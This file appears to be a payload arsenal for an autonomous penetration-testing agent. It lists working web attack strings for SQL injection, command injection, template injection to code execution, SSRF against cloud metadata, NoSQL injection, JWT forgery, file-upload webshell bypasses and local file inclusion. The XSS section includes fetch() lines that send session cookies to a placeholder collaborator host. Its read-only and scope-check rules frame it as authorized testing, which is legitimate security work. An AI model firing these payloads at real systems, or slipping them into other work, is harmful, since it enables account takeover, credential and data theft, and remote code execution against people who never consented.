# HEAVY PAYLOAD ARSENAL — War Heads for the Kill-Chain

> **Corpus sources**: this file = the agent's on-demand weapons. Extended payloads =
> `data/arsenal/payloads/` (PayloadsAllTheThings per-class files) + `data/arsenal/waf-bypass/`
> (multi-engine bypass probes) + Kali built-ins (`/usr/share/exploitdb` full public
> exploit archive + `/usr/share/wordlists` seclists). Fetch/refresh: `scripts/arsenal_fetch.py`.

> **Fire discipline (read first):** every payload below is an *evidence probe* —
> it proves impact read-only. No destructive write, no persistence, no log
> tampering (hard invariants). Confirm scope with
> `python scripts/authorize_full_power.py check --target <t>` before firing.
> A payload is a LEAD until the raw response is captured →
> `artifacts/<target>/evidence/<id>/`.

---

## 1. SQLi — Authentication Bypass (hits auth immediately)

```text
username:  admin' --            password: anything
username:  " OR "1"="1" --      password: anything
username:  admin'-- -           password: anything
username:  ') OR ('1'='1        (for parenthesized queries)
username:  ' OR true; --        (MSSQL/PG)
username:  1' or 1=1 #          (MySQL comment style)
```
Impact verify: the app returns a logged-in page/session — screenshot + cookie = proof.

## 2. SQLi — Data Exfil Proofs (READ-only, ordered by stealth)

```sql
' UNION SELECT NULL,user(),version(),database() --          # probe cols + banner
' UNION SELECT NULL,table_schema,table_name FROM information_schema.tables--
' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='<t>'--
' UNION SELECT NULL,username,password FROM users --          # LAST column: data
```
MySQL bounds: `extractvalue(1,concat(0x7e,(SELECT user())))` — error-based exfil
PostgreSQL: `' || (SELECT pg_sleep(5)) --` — time-based confirmation
SQLite: `' UNION SELECT 1,name,sql FROM sqlite_master --` — full schema

## 3. Command Injection — Proof Ladder (benign commands only)

```text
;id              || id              && id              `id`
$(whoami)        {{7*7}}           $(timeout 3 ping -c1 127.0.0.1)      # blind: timing
|cat /etc/passwd  ;cat /etc/passwd  ${IFS}              # IFS bypass for spaces
```
WAF space-bypass: `${IFS}`, `$IFS$9`, `<()` process substitution, `\%0a` newline.
Proof for RCE finding = `uid=`/`root:` output in the response — never a dropper.

## 4. SSTI — Fingerprint → RCE Chain

```text
{{7*7}}                → "49"  = Jinja2/Twig family
${7*7}                 → "49"  = Groovy/Thymeleaf
<%= 7*7 %>             → "49"  = ERB
#{7*7}                 → "49"  = Thymeleaf/Velocity
```
Jinja2 RCE proof (id only):
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{lipsum.__globals__['os'].popen('id').read()}}
```
Twig: `{{_self.env.registerAbstractFilter(1,1)}}` variants — capture output only.
ERB: `<%= system("id") %>`

## 5. SSRF — Cloud Metadata Cannon (railroad targets internal)

```text
http://169.254.169.254/latest/meta-data/           (AWS IMDSv1)
http://metadata.google.internal/computeMetadata/v1/  + header Metadata-Flavor: Google
http://169.254.169.254/metadata/instance?api-version=2021-02-01   (Azure IMDS)
```
Bypass matrix (host-level filters):
```text
127.0.0.1 | [::1] | 0.0.0.0 | localhost | 0177.0.0.1 | 2130706433 (decimal)
127.1 | 0x7f000001 (hex) | ０２７.０.０.１ (unicode digits)
```
Proof: response contains `ami-`/`-iam-`/`subscription_id` — never send creds out; log hash only.

## 6. XSS — Impact-Proof Polyglots (session theft = the point)

```html
<script>fetch('https://<collab>?c='+document.cookie)</script>
<img src=x onerror="fetch('//<collab>?c='+document.cookie)">
"onmouseover=alert(1) 　　　  "</td>
<svg/onload=location='//<collab>&#43;document.cookie'>
javascript:/*--></title></style></textarea></script></svg><script>//<img
src=x onerror=alert(document.domain)>/*</script>      ← love-letter polyglot
```
Make the stored one persistent-but-removable (a post title, a comment) — prove with ONE operator account, not users.

## 7. NoSQL — Operator Injection (auth bypass + blind exfil)

```text
u=admin&p[$ne]=x                → deny 'not equal' operator injection
u={'$ne':'junk'}  p={'$ne':'junk'}   (JSON mode)
{ "$where": "return this.a==this.b || 1==1" }   $where — DoS ONLY in lab scope
```
Auth bypass = response returns a named session → screenshot.

## 8. JWT — Algorithm Confusion Instant Kit

```bash
# none
echo '{"alg":"none","typ":"JWT"}...' | jwt_tool <token> -X none
# RS256→HS256 confusion: sign with public key as HMAC secret
python3 -c "import jwt,RSA_PUB..."  # or simply:
jwt_tool <token> -X k -pr RSA_PUB_FILE.pem     # confusion attack
# kid path traversal
kid: ../../dev/null                             # unsigned via empty-JWKS
```
Proof: server accepts forged token granting the operator a different role/uid → admin endpoint responds 200.

## 9. File Upload — 10-Bar Bypass Matrix (order-tested one at a time)

```text
bar:                 trick:
MIME check           Content-Type: image/jpeg  + PHP content
extension blacklist  .php5 .phtml .pht .phpP
double-ext           shell.php.jpg  /  shell.jpg.php
null byte            shell.jpg%00.php   (old stacks)
.htaccess upload     AddType application/x-httpd-php .jpg
race condition       upload+hit /uploads/ in the same second (loop)
polyglot             GIF89a header + php code  → image-inspecting PHP
zip bomb / webshell-in-archive  → unzip-enabled targets only
```
UNSAFE: after conventional lands under a canary name (`<canary>x.php`) — **do not keep it**; delete after phpinfo/whoami read-back, document before/after.

## 10. LFI — Read-Only Rails (no code-to-RCE by defpdf)

```text
/etc/passwd   /etc/hosts   /etc/ssh/sshd_config
/var/log/auth.log        (log-pollution check: add user=<needle> to logs — only log READ, no poison)
Windows: C:\Windows\win.ini   C:\inetpub\log\LogFiles\W3SVC1\
filter: ../../....//   ..%2f..%2f's   encoding: %252e%25 2e (double)
stream-wrappers: php://filter/convert.base64-encode/resource=<t>config.php
```
Proof: leak config/env non-secret lines only; redact creds from memory.

---

## Cadence

| Class | Blast radius | Stop if |
|---|---|---|
| Any hit | immediate capture | scope gate returns DENY |
| Auth bypass / SQLi / SSRF / LFI | read-only | response tampered/degraded |
| RCE (SSTI/cmd-inj) | `id`/`whoami` only | dropper/persistence temptation |
| Upload | canary name, removed after read | cleanup impossible |
